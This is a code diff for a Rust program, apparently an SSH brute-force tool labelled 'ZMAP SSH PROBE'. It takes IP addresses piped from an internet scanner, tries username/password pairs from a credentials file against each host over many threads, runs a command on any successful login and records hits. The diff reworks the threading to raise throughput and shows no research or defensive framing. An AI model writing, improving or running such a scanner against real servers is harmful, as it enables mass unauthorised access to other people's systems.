@@ -3,13 +3,13 @@ use std::io::{self, BufRead, Write, BufWriter};
 use std::fs::OpenOptions;
 use std::net;
 use std::sync::mpsc;
-use threadpool::ThreadPool;
-use std::thread;
 use std::time::Duration;
 use std::sync::atomic::{AtomicUsize, Ordering};
 use colored::*; 
 use clap::Parser;
 use std::io::Read;
+use std::thread;
+use std::sync::{Arc, Mutex};
 
 static IMPORTED: AtomicUsize = AtomicUsize::new(0);
 static CHECKED: AtomicUsize = AtomicUsize::new(0);
@@ -38,7 +38,8 @@ fn main() {
     let args = Args::parse();
 
     let (ip_tx, ip_rx) = mpsc::channel();
-   
+    let ip_rx = Arc::new(Mutex::new(ip_rx));
+       
     thread::spawn(|| {
         println!("+-------------------------------------------+");
         println!("|             ZMAP SSH PROBE                |");
@@ -69,7 +70,7 @@ fn main() {
         }
     });
 
-    std::thread::spawn(move || {
+    thread::spawn(move || {
         let stdin = io::stdin();
         for line in stdin.lock().lines() {
             let ip = line.expect("Failed to read line");
@@ -79,26 +80,33 @@ fn main() {
     });
 
     let credentials = load_credentials_file("credentials.txt");
+    const STACK_SIZE: usize = 8 * 1024 * 1024; // 8MB
 
-    let pool = ThreadPool::new(args.threads);
-
-    loop {
-        match ip_rx.recv() {
-            Ok(ip) => {
-                let creds = credentials.clone();
-                let output_file = args.output_file.clone();
+    let handles: Vec<_> = (0..args.threads).map(|_| {
+        let ip_rx = Arc::clone(&ip_rx);
+        let creds = credentials.clone();
+        let output_file = args.output_file.clone();
     
-                pool.execute(move || {
-                    check_ssh_login(ip, args.port, creds, &output_file);
-                });                                           
+        std::thread::Builder::new().stack_size(STACK_SIZE).spawn(move || {
+            loop {
+                let ip;
+                {
+                    let receiver = ip_rx.lock().unwrap();
+                    ip = receiver.recv();
+                }
+    
+                match ip {
+                    Ok(ip) => check_ssh_login(ip, args.port, creds.clone(), &output_file),
+                    Err(_) => break, // Break loop when no more IPs
+                }
             }
-            Err(_) => {
-                // Channel is closed, no more IPs
-                break;
-            }
-        }
+        }).unwrap()
+    }).collect();
+
+    // Wait for all threads to finish
+    for handle in handles {
+        handle.join().unwrap();
     }
-    pool.join();
 }
 
 fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, output_file: &str) {
@@ -144,7 +152,7 @@ fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, ou
 
                     // Read any potential output from the command
                     let mut output = String::new();
-                    if let Err(e) = channel.read_to_string(&mut output) {
+                    if let Err(_e) = channel.read_to_string(&mut output) {
                         //println!! ("Error reading output for IP {} with username {}: {}", ip, username, e);
                     }
 
@@ -152,7 +160,7 @@ fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, ou
                     channel.send_eof().unwrap_or_default();
 
                     // Now, try to close the channel
-                    if let Err(e) = channel.wait_close() {
+                    if let Err(_e) = channel.wait_close() {
                         //println!! ("Channel close error for IP {} with username {}: {}", ip, username, e);
                         FAILED.fetch_add(1, Ordering::Relaxed);
                         continue;
